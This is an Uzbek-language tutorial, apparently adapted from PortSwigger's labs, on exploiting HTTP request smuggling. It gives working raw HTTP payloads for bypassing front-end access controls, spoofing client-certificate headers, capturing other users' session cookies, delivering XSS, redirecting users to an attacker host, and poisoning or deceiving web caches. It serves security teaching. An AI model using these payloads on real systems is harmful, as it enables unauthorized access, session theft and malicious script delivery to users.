# Foydalanish

Bu bo'limda [<mark style="color:yellow;">HTTP request smuggling</mark>](./) <mark style="color:yellow;"></mark> zaifliklari qanday yo'llar bilan exploit qilinishi haqida gaplashamiz.

## <mark style="color:yellow;">HTTP Request Smuggling dan foydalangan holda Front-end xavfsizlik nazoratlarini aylanib o'tish</mark> <a href="#http-request-smuggling-dan-foydalangan-holda-front-end-xavfsizlik-nazoratlarini-aylanib-otish" id="http-request-smuggling-dan-foydalangan-holda-front-end-xavfsizlik-nazoratlarini-aylanib-otish"></a>

Ba'zi veb-saytlar ba'zi xavfsizlik boshqaruvlarini amalga oshirish va individual so'rovlarni qayta ishlashga ruxsat berish yoki berilmasligini hal qilish uchun front-end veb-serveridan foydalanadi. Ruxsat berilgan so'rovlar back-end serveriga yo'naltiriladi, u erda ular front-end tekshiruvidan o'tgan deb hisoblanadi.

Masalan, tasavvur qiling bitta web sayt bor u frontend orqali xavfsizlik nazoratlarini amalga oshiradi va faqatgina ruxsat berilgan foydalanuvchilarning so'rovlari yo'naltiriladi.  Backend server esa ularni tekshirmasdan qabul qilaveradi. Ushbu holatda HTTP Request Smuggling zaifligi orqali access controlni aylanib o'tish mumkin.

Deylik, bitta foydalanuvchiga `/home` sahifasi uchun ruxsat bor ammo u `/admin` sahifasiga kirolmaydi. Ushbu holatda biz ularning cheklovlarini quyidagi Request Smuggling xujumi orqali aylanib o'ta olamiz:

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

Front-end serveri bu yerda `/home` sahifasi uchun ikkita so'rovni ko'radi va shuning uchun so'rovlar back-end serveriga yo'naltiriladi. Biroq, back-end serveri `/home`  requestini va /admin requestini ko'radi. U (har doimgidek) requestlarni front-end tekshiruvidan o'tgan deb taxmin qiladi va shuning uchun cheklangan URL manziliga kirish huquqini beradi.

{% hint style="warning" %}
<mark style="color:yellow;">Lab:</mark> [HTTP Request Smuggling dan foydalangan holda Front-end xavfsizlik nazoratlarini aylanib o'tish, CL.TE zaiflik ≫](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
{% endhint %}

{% hint style="warning" %}
<mark style="color:yellow;">Lab:</mark> [HTTP Request Smuggling dan foydalangan holda Front-end xavfsizlik nazoratlarini aylanib o'tish, TE.CL zaiflik ≫](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
{% endhint %}

Ko'pgina veb-saytlarda, front-end serveri so'rovlarni backend serveriga yuborishdan oldin, odatda, ba'zi qo'shimcha so'rov headerlarini qo'shish orqali qayta yozishni amalga oshiradi. Masalan, front-end server quyidagilarni bajaradi:

* TLS ulanishni to'xtatadi, foydalanilgan protokol  va shifrni tavsiflovchi ba'zi headerlarni qo'shadi;
* Foydalanuvchining IP manzilini o'z ichiga olgan `X-Forwarded-For` headerini qo'shadi;
* Seans tokeni asosida foydalanuvchi identifikatorini aniqlash va foydalanuvchini identifikatsiya qiluvchi header qo'shadi; yoki
* Bir qancha xujumni amalga oshirishga sabab bo'luvchi narsalar ham qo'shishi mumkin

Ba'zi paytlarda, agar sizning smuggled requestlaringizda  front-end server tomonidan qo'shiladigan ba'zi headerlar bo'lmasa, backend server so'rovlarni odatdagidek qayta ishlamasligi mumkin, natijada Request Smuggling xujumlari kutilganidek bo'lmasligi mumkin.

Front-end server, requestlarni qanday qilib qayta yozayotganini aniqlashning oddiy usuli mavjud. Buning uchun siz quyidagi amallarni bajarishingiz kerak:

* Veb-sayt response qismida request parametrining qiymatini ko'rsatuvchi POST requestini toping.
* Parametrlarni aralashtirib yuboring, shunda ko'rsatilgan parametr, response xabarining oxirida paydo bo'ladi.
* Ushbu so'rovni back-endga yuboring, so'ngra darhol, "requestning qayta yozilish"ini aniqlovchi oddiy request yuboring.

Tasavvur qiling web saytda login funksiyasida email parametri mavjud:

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

Buning natijasi javobda mana bunday bo'ladi:

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

Bu yerda siz front-end serveri tomonidan bajariladigan "requestni qayta yozish"ini aniqlash uchun quyidagi request smuggling hujumidan foydalanishingiz mumkin:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

Requeslat qo'shimcha headerlarni kiritish uchun front-end server tomonidan qayta yoziladi, so'ngra backend server Request Smugglingni qayta ishlaydi va qayta yozilgan ikkinchi so'rovni elektron pochta parametrining qiymati sifatida ko'rib chiqadi. Keyin ikkinchi so'rovning javobida ushbu qiymatni aks ettiradi:

```http
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

{% hint style="info" %}
**Eslatma:**

Yakuniy so'rov qayta yozilayotganligi sababli, u qancha davom etishini bilmaysiz. Smuggled requestning `Content-Length` headeridagi qiymat, back-end server, **requestga qancha vaqt ishonishini aniqlaydi**. Agar siz bu qiymatni juda qisqa qilib qo'ysangiz, qayta yozilgan so'rovning faqat bir qisminigina olasiz; agar siz uni juda uzun qilib qo'ysangiz server, request tugashi uchun time out bo'ladi. Albatta buning yechimi biror bir kattaroq raqamni tanlab har so'rov jo'natganda uni oshirib borish va kerakli ma'lumotlarni qo'lga kiritguncha uni takrorlashdir
{% endhint %}

Front-end serveri so'rovlarni qanday qilib qayta yozishini aniqlaganingizdan so'ng, Back-end serveri tomonidan belgilangan tartibda qayta ishlanishini ta'minlash uchun smuggled requestlaringiga kerakli qayta yozishni qo'llashingiz mumkin.

{% hint style="info" %}
<mark style="color:yellow;">**Lab:**</mark> [Frontend ning so'rovni qayta yozishini aniqlashda HTTP request smugglingni exploit qilish ≫](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)
{% endhint %}

## <mark style="color:yellow;">Browser avtorizatsiyasini aylanib o'tish</mark> <a href="#mijoz-avtorizatsiyasini-aylanib-otish" id="mijoz-avtorizatsiyasini-aylanib-otish"></a>

TLS handshakening bir qismi sifatida, serverlar sertifikat taqdim etish orqali mijoz ( brauzer) bilan oʻzlarini autentifikatsiya qiladi. Ushbu sertifikat ularning ro'yxatdan o'tgan host nomiga mos kelishi kerak bo'lgan "common name" (CN) ni o'z ichiga oladi. Browser bundan keyin kirilgan dommenning haqiqiy serveri bilan aloqa qilayotganini tekshirish uchun foydalanishi mumkin.

Ba'zi saytlar birinchi bo'lib TLS autentifikatsiya shaklini amalga oshiradi, bu esa browserdan serverga sertifikat taqdim etishni talab qiladi. Bunday holda, browserning CNning nomi ko'pincha foydalanuvchi nomi bo'ladi yoki shunga o'xshash bo'lib, undan access control mexanizmining bir qismi sifatida back-end server logikasida foydalanish mumkin.

Browserni autentifikatsiya qiluvchi komponent odatda sertifikatdan tegishli ma'lumotlarni bir yoki bir nechta nostandart HTTP headerlar orqali saytga yoki back-end serveriga uzatadi. Misol uchun, Front-end serverlari ba'zan barcha kiruvchi so'rovlarga browserning CN-ni bilan header qo'shadi:

```http
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

Ushbu headerlar foydalanuvchilardan butunlay yashirin bo'lishi kerakligi sababli, ko'pincha backend serverlar bu headerlarga shuhasiz ishoniladi. Bundan taxmin qilish mumkinki siz to'g'ri berilgan headerlar va qiynatlar orqali access control (kirish nazoratini) aylanib o'tishingiz mumkin.

Amalda, bu harakatlar odatda ishlatilmaydi, chunki agar bu headerlar allaqachon mavjud bo'lsa fron-end serverlar bu headerlarni qayta yozishga moyil. Biroq, smuggled requestlar uni front-end'dan to'liq yashiradi, shuning uchun ulardagi barcha header back-endga o'zgarishsiz boradi.

```http
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

## <mark style="color:yellow;">Boshqa foydalanuvchilarning so'rovlarini yozib olish.</mark> <a href="#boshqa-foydalanuvchilarning-sorovlarini-qolga-kiritish" id="boshqa-foydalanuvchilarning-sorovlarini-qolga-kiritish"></a>

Agar veb-sayt matnli ma'lumotlarni saqlash va olish imkonini beruvchi har qanday funksiyani o'z ichiga olsa, HTTP Request Smuggling orqali boshqa foydalanuvchilarning so'rovlarini qo'lka kiritish mumkin. Bunda ko'pincha sessiya tokenlarni, sessiyalarni o'g'irlash yoki foydalanuvchi tomonidan yuborilgan biror maxfiy ma'lumotlarni qo'lga kiritish mumkin. Ushbu xujumni amalga oshirish izohlar, emaillar, profil ma'lumotlari va hokazolar vosita bo'lishi mumkin.

So'rovda oxirgi joylashtirilgan ma'lumotlarni o'z ichiga olgan parametr bilan saqlash funksiyasiga ma'lumotlarni yuboradigan so'rovni yashirincha olib o'tishingiz kerak. Back-end server tomonidan qayta ishlanadigan keyingi so'rov yashirin(smuggle) so'rovga qo'shiladi, natijada boshqa foydalanuvchining qayta ishlanmagan so'rovi saqlanadi.

Faraz qilaylik, websayt blogda saqlanadigan va ko‘rsatiladigan blog postga izoh yuborish uchun quyidagi so‘rovdan foydalanadi:

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

Maʼlumotlarni saqlash soʻrovini back-end serverga olib oʻtuvchi quyidagi request smuggling hujumini amalga oshirishingiz mumkin:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

Boshqa foydalanuvchining requesti back-end server tomonidan koʻrib chiqilganda, u so'rov biz yuborgan smuggled requestga qoʻshiladi va uning natijalari cookie lari va shunga o'xshash maxfiy ma'lumotlari saqlanadi:

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

Keyin, saqlangan ma'lumotlarni odatdagidek olish orqali boshqa foydalanuvchi so'rovining ma'lumotlarini olishingiz mumkin.

{% hint style="info" %}
**Eslatma:**

Ushbu usulda bitta cheklov bor, u odatda faqat smuggled so'roviga tegishli bo'lgan parametrlarni ajratuvchi belgigacha ma'lumotlarni ushlaydi. Encode qilingan holatda yuborilgan URLda u & belgisi hisoblanadi, ya'ni foydalanuvchining so'rovidan saqlangan ma'lumot birinchi \&da tugaydi, u hatto query stringlarida ham bo'lishi mumkin.
{% endhint %}

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Boshqa foydalanuvchilarning so'rovlarini yozib olishda HTTP request smugglingni exploit qilish ≫](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
{% endhint %}

## <mark style="color:yellow;">HTTP Request Smuggling dan foydalangan holda reflected XSS ni exploit qilish</mark> <a href="#http-request-smuggling-dan-foydalangan-holda-reflected-xss-ni-exploit-qilish" id="http-request-smuggling-dan-foydalangan-holda-reflected-xss-ni-exploit-qilish"></a>

Agar veb-saytda HTTP request smuggling va reflected XSS zaifligi bo'lsa, veb-saytning boshqa foydalanuvchilarga tasir ko'rsatish uchun HTTP request smuggling hujumidan foydalanishingiz mumkin. Ushbu yondashuv oddiy reflected XSS dan ikki jihati bilan ustun:

* Bu foydalanuvchilar bilan o'zaro aloqani talab qilmaydi. Siz ularga URL manzilni berishingiz va ular URLga kirishlarini kutishingiz shart emas. Siz shunchaki XSS payloadi kiritilgan requestni yashirincha olib o'tasiz va keyingi foydalanuvchining so'rovi server tomonidan qayta ishlanadi.
* HTTP so'rov headerlari kabi oddiy reflected XSS hujumida boshqarib bo'lmaydigan so'rov qismlarida XSSni exploit qilishda foydalanish mumkin.

Masalan tasavvur qiling `User-Agent` headerida Reflected XSS bor. Siz quyidagi tarzda Request Smuggling xujumini amalga oshirishingiz mumkin:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

Keyingi foydalanuvchi soʻrovi smuggled requestga qoʻshiladi va ular responseda XSS payloadini kiritadi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Reflected XSS qilish uchun HTTP Request Smugglingni exploit qilish ≫](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
{% endhint %}

## <mark style="color:yellow;">HTTP Request Smuggling orqali on-site redirection ni open-redirection ga aylantirish</mark> <a href="#http-request-smuggling-orqali-on-site-redirection-ni-open-redirection-ga-aylantirish" id="http-request-smuggling-orqali-on-site-redirection-ni-open-redirection-ga-aylantirish"></a>

Ko'p web saytlar bir URL dan boshqasiga o'tish uchun **on-site redirectdan** foydalanadi va hostnameni requestning **Host header**idan redirect qiluvchi URL ichiga joylashtiradi. Masalan ushbu hatti harakat Apache va IIS web serverlarida sukut bo'yicha yoqilgan bo'ladi, ya'ni, / belgisi mavjud bo'lmagan papka uchun so'rov / belgisi mavjud papkaga redirect qilinadi.

```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

Ushbu hatti harakat aslida zararlimas, lekin undan boshqa foydalanuvchilarni tashqi domenga yoʻnaltirish uchun Request Smuggling  hujumida foydalanish mumkin Masalan:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

Ushbu smuggled so‘rovi hackerning saytiga yo‘naltiradi, bu keyingi foydalanuvchining back-end serveri tomonidan qayta ishlanadigan so‘roviga ta’sir qiladi. Maslaan:

```http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

Bu erda foydalanuvchining so'rovi veb-saytdagi sahifa tomonidan import qilingan JavaScript fayli uchun edi. Xaker javobda o'z JavaScript-ni qaytarish orqali foydalanuvchini to'liq buzishi mumkin.

## <mark style="color:yellow;">Root-relative redirectionni Open redirectionga aylantirish</mark>

Ba'zi hollarda siz Location headeri uchun root-relative URL manzilini yaratish yo'lidan foydalanadigan server darajasidagi open redirectionlarga duch kelishingiz mumkin.

```http
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

Agar server protokolga tegishli URL manzilidan foydalanishga ruxsat bersa, bundan hali ham ochiq yoʻnaltirish uchun foydalanish mumkin:

```http
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Premanently
Location: //attacker-website.com/example/
```

## <mark style="color:yellow;">Web Cache zararlashda HTTP Request Smugglingdan foydalanish</mark> <a href="#web-cache-poisoning-ni-amalga-oshirish-uchun-http-request-smuggling-dan-foydalanish" id="web-cache-poisoning-ni-amalga-oshirish-uchun-http-request-smuggling-dan-foydalanish"></a>

Xujum qilish usullaridan yana biri bu HTTP Request Smuggling dan foydalangan holda Web Cache Poisoning xujumini amalga oshirishdir. Agar Frontend ning biror bir qismi cachelardan foydalansa (albatta cache lardan foydalanish performance sababidan bo'ladi ko'pincha), off-site redirect response bilan keshni zararlash mumkin bo'lishi mumkin. Bu xujumni doimiy ravishda amalga oshirish imkoniyatini beradi va har qanday ta'sir o'tkazilgan URL ga kirgan foydalanuvchiga ta'sir o'tkazishi mumkin.

Ushbu misolda, Haker quyidagilarni Frontend serverga yubormoqda:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

Smuggled request, back-end serverga yetib boradi, u avvalgidek off-site redirect bilan javob beradi. Front-end serveri bu javobni ikkinchi so'rovdagi URL manziliga qarshi keshlaydi, ya'ni /static/include.js:

```http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

Bundan keyin, foydalanuvchilar ushbu URL ga so'rov yuborishsa, sayt ularni haker tomonidan yozilgan web saytga yo'naltirib yuboraveradi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [Web Cache zararlashda HTTP Request Smugglingni exploit qilish ≫](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)
{% endhint %}

## <mark style="color:yellow;">Web Cacheni aldashda HTTP Request Smugglingdan foydalanish</mark> <a href="#web-cache-poisoning-ni-amalga-oshirish-uchun-http-request-smuggling-dan-foydalanish" id="web-cache-poisoning-ni-amalga-oshirish-uchun-http-request-smuggling-dan-foydalanish"></a>

Hali yana bir xujum turi mavjud bo'lib siz Web Cache Deception orqali HTTP Request Smuggling hujumning kuchini oshira olasiz. Ushbu xujum Web Cache Poisoning xujumiga o'xshab ishlaydi ammo boshqa boshqa maqsadlarda ishlatiladi.

{% hint style="warning" %}
**Web Cache Poisoning va Web Cache Deception orasida qanday farq bor ?**

* **Web Cache Poisoning**da Haker web sayt keshiga bir qancha zararli kontentni kiritadi va u kontent boshqa foydalanuvchilarga ham ta'sir o'tkazadi
* **Web Cache Deception**da Haker web saytdagi boshqa bir foydalanuvchining keshlariga bir qancha maxfiy kontentni kiritadi va uni keshdan oladi.
{% endhint %}

Bu usulda haker Request Smuggling qilib foydalanuvchiga tegishli bir qancha maxfiy ma'lumotlarni qabul qilmoqda. Masalan:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

Keyingi request boshqa foydalanuvchidan sessiya cookielarni va boshqa headerlarni o'z ichiga olgan holda smuggled requestga qo'shilib backend-serverga yuboriladi. Masalan:

```http
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

Backend server bu so'rovni oddiy so'rov kabi qabul qiladi va sizga javob qaytaradi. Ushbu URL da, foydalanuvchining shaxsiy xabarlari va session cookie lariga so'rov yuborilmoqda. Front-end serveri bu responseni ikkinchi requestdagi `/static/some-image.png` URL manziliga qarshi keshlaydi.

```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

Haker shunda ushbu URLga kirishi va keshdan kerakli mahfiy ma'lumotlarni qo'lga kiritishi mumkin.

Muhim ogohlantirish, ushbu xujumda Haker qancha ma'lumot URL keshiga yuklanayotganini bilmaydi, sababi jabrlanuvchi foydalanuvchi URL ga tashrif buyurganda nima bo'lishini biz yuborgan so'rovdan oldindan taxmin qilish qiyin. Xakerga olingan kontentni topish uchun koʻp sonli statik URL manzillarini yozib olish kerak boʻlishi mumkin.

{% hint style="warning" %}
<mark style="color:yellow;">Lab:</mark> [Web Cacheni aldashda HTTP Request Smugglingni exploit qilish ≫](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)
{% endhint %}
